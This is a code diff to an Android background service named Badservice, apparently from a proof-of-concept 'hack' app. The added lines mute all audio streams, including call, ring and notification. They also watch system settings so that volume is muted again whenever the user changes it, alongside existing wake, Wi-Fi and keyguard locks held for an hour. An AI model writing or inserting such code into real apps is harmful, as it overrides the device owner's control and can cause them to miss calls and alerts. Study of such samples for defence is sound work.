@@ -5,6 +5,8 @@ import android.app.KeyguardManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.database.ContentObserver;
+import android.media.AudioManager;
 import android.net.wifi.WifiManager;
 import android.os.Handler;
 import android.os.PowerManager;
@@ -15,6 +17,7 @@ public class Badservice extends IntentService {
     private PowerManager.WakeLock wakeLock;
     private KeyguardManager.KeyguardLock keyguardLock;
     private WifiManager.WifiLock wifiLock;
+    private AudioManager audio;
 
     public Badservice() {
         super("Badservice");
@@ -39,7 +42,11 @@ public class Badservice extends IntentService {
                 | PowerManager.ON_AFTER_RELEASE, "hack_wakelock");
         wakeLock.acquire();
         Log.d(HackActivity.TAG, "Badservice running, will hold wifi lock, wakelock and keyguard lock");
+        audio = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
 
+        SettingsContentObserver observer = new SettingsContentObserver(new Handler());
+        this.getApplicationContext().getContentResolver().registerContentObserver(
+                android.provider.Settings.System.CONTENT_URI, true, observer);
 
         handler.postDelayed(new Runnable() {
             @Override
@@ -51,6 +58,8 @@ public class Badservice extends IntentService {
                 stopSelf();
             }
         }, 1000 * 60 * 60);
+        
+        muteVolume();
     }
 
     @Override
@@ -63,5 +72,28 @@ public class Badservice extends IntentService {
 
     }
 
+    public class SettingsContentObserver extends ContentObserver {
+        public SettingsContentObserver(Handler handler) {
+            super(handler);
+        }
+
+        @Override
+        public boolean deliverSelfNotifications() {
+            return super.deliverSelfNotifications();
+        }
+
+        @Override
+        public void onChange(boolean selfChange) {
+            super.onChange(selfChange);
+            muteVolume();
+        }
+    }
+
+    private void muteVolume() {
+        int[] volumes = new int[]{AudioManager.STREAM_VOICE_CALL, AudioManager.STREAM_SYSTEM, AudioManager.STREAM_RING, AudioManager.STREAM_MUSIC, AudioManager.STREAM_NOTIFICATION};
+        for (int volumeType : volumes) {
+            audio.setStreamMute(volumeType, true);
+        }
+    }
 
 }
